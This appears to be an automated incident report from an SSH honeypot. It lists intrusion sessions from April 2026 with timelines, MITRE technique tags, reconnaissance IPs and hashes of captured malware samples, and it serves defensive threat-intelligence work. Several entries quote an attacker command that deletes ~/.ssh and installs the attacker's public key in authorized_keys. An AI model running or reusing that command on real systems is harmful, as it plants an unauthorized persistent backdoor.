| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:07 |
| **Last Seen** | 2026-04-19 07:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:07:43` | `cowrie.session.connect` |
| `2026-04-19 07:07:43` | `cowrie.client.version` |
| `2026-04-19 07:07:44` | `cowrie.client.kex` |
| `2026-04-19 07:07:44` | `cowrie.login.success` |
| `2026-04-19 07:07:45` | `cowrie.session.params` |
| `2026-04-19 07:07:45` | `cowrie.command.input` |
| `2026-04-19 07:07:45` | `cowrie.command.failed` |
| `2026-04-19 07:07:45` | `cowrie.log.closed` |
| `2026-04-19 07:07:46` | `cowrie.session.params` |
| `2026-04-19 07:07:46` | `cowrie.command.input` |
| `2026-04-19 07:07:46` | `cowrie.session.file_download` |
| `2026-04-19 07:07:46` | `cowrie.log.closed` |
| `2026-04-19 07:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79c8c1a0e3c3

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:07 |
| **Last Seen** | 2026-04-19 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:07:49` | `cowrie.session.connect` |
| `2026-04-19 07:07:49` | `cowrie.client.version` |
| `2026-04-19 07:07:49` | `cowrie.client.kex` |
| `2026-04-19 07:07:50` | `cowrie.login.success` |
| `2026-04-19 07:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4ea4ae8f6e5

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:09 |
| **Last Seen** | 2026-04-19 07:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:09:25` | `cowrie.session.connect` |
| `2026-04-19 07:09:25` | `cowrie.client.version` |
| `2026-04-19 07:09:25` | `cowrie.client.kex` |
| `2026-04-19 07:09:26` | `cowrie.login.success` |
| `2026-04-19 07:09:26` | `cowrie.session.params` |
| `2026-04-19 07:09:26` | `cowrie.command.input` |
| `2026-04-19 07:09:27` | `cowrie.command.failed` |
| `2026-04-19 07:09:27` | `cowrie.log.closed` |
| `2026-04-19 07:09:27` | `cowrie.session.params` |
| `2026-04-19 07:09:27` | `cowrie.command.input` |
| `2026-04-19 07:09:27` | `cowrie.session.file_download` |
| `2026-04-19 07:09:27` | `cowrie.log.closed` |
| `2026-04-19 07:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ec41b3c446a

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:09 |
| **Last Seen** | 2026-04-19 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:09:30` | `cowrie.session.connect` |
| `2026-04-19 07:09:30` | `cowrie.client.version` |
| `2026-04-19 07:09:30` | `cowrie.client.kex` |
| `2026-04-19 07:09:31` | `cowrie.login.success` |
| `2026-04-19 07:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b96c325fbefc

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:11 |
| **Last Seen** | 2026-04-19 07:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:11:10` | `cowrie.session.connect` |
| `2026-04-19 07:11:10` | `cowrie.client.version` |
| `2026-04-19 07:11:11` | `cowrie.client.kex` |
| `2026-04-19 07:11:12` | `cowrie.login.success` |
| `2026-04-19 07:11:12` | `cowrie.session.params` |
| `2026-04-19 07:11:12` | `cowrie.command.input` |
| `2026-04-19 07:11:12` | `cowrie.command.failed` |
| `2026-04-19 07:11:12` | `cowrie.log.closed` |
| `2026-04-19 07:11:13` | `cowrie.session.params` |
| `2026-04-19 07:11:13` | `cowrie.command.input` |
| `2026-04-19 07:11:13` | `cowrie.session.file_download` |
| `2026-04-19 07:11:13` | `cowrie.log.closed` |
| `2026-04-19 07:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80017898f933

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:11 |
| **Last Seen** | 2026-04-19 07:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:11:16` | `cowrie.session.connect` |
| `2026-04-19 07:11:16` | `cowrie.client.version` |
| `2026-04-19 07:11:16` | `cowrie.client.kex` |
| `2026-04-19 07:11:17` | `cowrie.login.success` |
| `2026-04-19 07:11:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d933dabf159a

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:13 |
| **Last Seen** | 2026-04-19 07:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:13:01` | `cowrie.session.connect` |
| `2026-04-19 07:13:01` | `cowrie.client.version` |
| `2026-04-19 07:13:01` | `cowrie.client.kex` |
| `2026-04-19 07:13:02` | `cowrie.login.success` |
| `2026-04-19 07:13:02` | `cowrie.session.params` |
| `2026-04-19 07:13:02` | `cowrie.command.input` |
| `2026-04-19 07:13:02` | `cowrie.command.failed` |
| `2026-04-19 07:13:02` | `cowrie.log.closed` |
| `2026-04-19 07:13:03` | `cowrie.session.params` |
| `2026-04-19 07:13:03` | `cowrie.command.input` |
| `2026-04-19 07:13:03` | `cowrie.session.file_download` |
| `2026-04-19 07:13:03` | `cowrie.log.closed` |
| `2026-04-19 07:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27869bc679f1

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:13 |
| **Last Seen** | 2026-04-19 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:13:06` | `cowrie.session.connect` |
| `2026-04-19 07:13:06` | `cowrie.client.version` |
| `2026-04-19 07:13:06` | `cowrie.client.kex` |
| `2026-04-19 07:13:07` | `cowrie.login.success` |
| `2026-04-19 07:13:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6115267d02f1

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:18 |
| **Last Seen** | 2026-04-19 07:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:18:24` | `cowrie.session.connect` |
| `2026-04-19 07:18:24` | `cowrie.client.version` |
| `2026-04-19 07:18:24` | `cowrie.client.kex` |
| `2026-04-19 07:18:25` | `cowrie.login.success` |
| `2026-04-19 07:18:26` | `cowrie.session.params` |
| `2026-04-19 07:18:26` | `cowrie.command.input` |
| `2026-04-19 07:18:26` | `cowrie.command.failed` |
| `2026-04-19 07:18:26` | `cowrie.log.closed` |
| `2026-04-19 07:18:26` | `cowrie.session.params` |
| `2026-04-19 07:18:26` | `cowrie.command.input` |
| `2026-04-19 07:18:27` | `cowrie.session.file_download` |
| `2026-04-19 07:18:27` | `cowrie.log.closed` |
| `2026-04-19 07:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03ee98b3f185

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:18 |
| **Last Seen** | 2026-04-19 07:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:18:29` | `cowrie.session.connect` |
| `2026-04-19 07:18:29` | `cowrie.client.version` |
| `2026-04-19 07:18:30` | `cowrie.client.kex` |
| `2026-04-19 07:18:30` | `cowrie.login.success` |
| `2026-04-19 07:18:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2522c28983e

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:20 |
| **Last Seen** | 2026-04-19 07:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:20:10` | `cowrie.session.connect` |
| `2026-04-19 07:20:10` | `cowrie.client.version` |
| `2026-04-19 07:20:11` | `cowrie.client.kex` |
| `2026-04-19 07:20:12` | `cowrie.login.success` |
| `2026-04-19 07:20:12` | `cowrie.session.params` |
| `2026-04-19 07:20:12` | `cowrie.command.input` |
| `2026-04-19 07:20:12` | `cowrie.command.failed` |
| `2026-04-19 07:20:12` | `cowrie.log.closed` |
| `2026-04-19 07:20:13` | `cowrie.session.params` |
| `2026-04-19 07:20:13` | `cowrie.command.input` |
| `2026-04-19 07:20:13` | `cowrie.session.file_download` |
| `2026-04-19 07:20:13` | `cowrie.log.closed` |
| `2026-04-19 07:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65373fbfce63

| Field | Detail |
|---|---|
| **Source IP** | `116.193.190[.]100` |
| **First Seen** | 2026-04-19 07:20 |
| **Last Seen** | 2026-04-19 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:20:16` | `cowrie.session.connect` |
| `2026-04-19 07:20:16` | `cowrie.client.version` |
| `2026-04-19 07:20:16` | `cowrie.client.kex` |
| `2026-04-19 07:20:17` | `cowrie.login.success` |
| `2026-04-19 07:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.193.190[.]100` to AbuseIPDB if not already reported
- [ ] Block `116.193.190[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87c7403d15ed

| Field | Detail |
|---|---|
| **Source IP** | `221.226.31[.]137` |
| **First Seen** | 2026-04-19 07:29 |
| **Last Seen** | 2026-04-19 07:30 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 07:29:51` | `cowrie.session.connect` |
| `2026-04-19 07:29:51` | `cowrie.client.version` |
| `2026-04-19 07:29:52` | `cowrie.client.kex` |
| `2026-04-19 07:29:55` | `cowrie.login.success` |
| `2026-04-19 07:30:20` | `cowrie.session.params` |
| `2026-04-19 07:30:20` | `cowrie.command.input` |
| `2026-04-19 07:30:21` | `cowrie.log.closed` |
| `2026-04-19 07:30:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.226.31[.]137` to AbuseIPDB if not already reported
- [ ] Block `221.226.31[.]137` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.18.113[.]233` | **28** | 2026-04-19 06:02 | 2026-04-19 06:15 | 39m | 7 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `120.203.25[.]201` | **26** | 2026-04-19 06:18 | 2026-04-19 06:37 | 46m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `116.193.190[.]100` | **25** | 2026-04-19 06:39 | 2026-04-19 07:21 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `119.209.12[.]20` | **25** | 2026-04-19 06:20 | 2026-04-19 07:00 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `138.84.41[.]136` | **25** | 2026-04-19 06:35 | 2026-04-19 06:55 | 1m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.248.82[.]58` | **25** | 2026-04-19 06:01 | 2026-04-19 06:43 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `193.123.245[.]198` | **25** | 2026-04-19 06:03 | 2026-04-19 06:46 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `210.14.142[.]89` | **22** | 2026-04-19 06:01 | 2026-04-19 06:17 | 36m | 2 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.126.64[.]76` | 1 | 2026-04-19 06:41 | 2026-04-19 06:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.12.161[.]149` | 1 | 2026-04-19 06:01 | 2026-04-19 06:01 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `120.48.144[.]5` | 1 | 2026-04-19 07:07 | 2026-04-19 07:08 | 83s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]71` | 1 | 2026-04-19 06:04 | 2026-04-19 06:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `157.0.0[.]10` | 1 | 2026-04-19 06:16 | 2026-04-19 06:16 | 30s | 0 | `T1592` | 🟢 LOW |
| `176.65.148[.]127` | 1 | 2026-04-19 07:00 | 2026-04-19 07:00 | 31s | 0 | `T1592` | 🟢 LOW |
| `181.45.193[.]221` | 1 | 2026-04-19 06:35 | 2026-04-19 06:35 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.134.94[.]17` | 1 | 2026-04-19 06:02 | 2026-04-19 06:02 | 37s | 0 | `T1592` | 🟢 LOW |
| `221.226.31[.]137` | 1 | 2026-04-19 07:29 | 2026-04-19 07:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `42.200.78[.]166` | 1 | 2026-04-19 06:04 | 2026-04-19 06:04 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.154.0[.]104` | 1 | 2026-04-19 06:36 | 2026-04-19 06:38 | 95s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
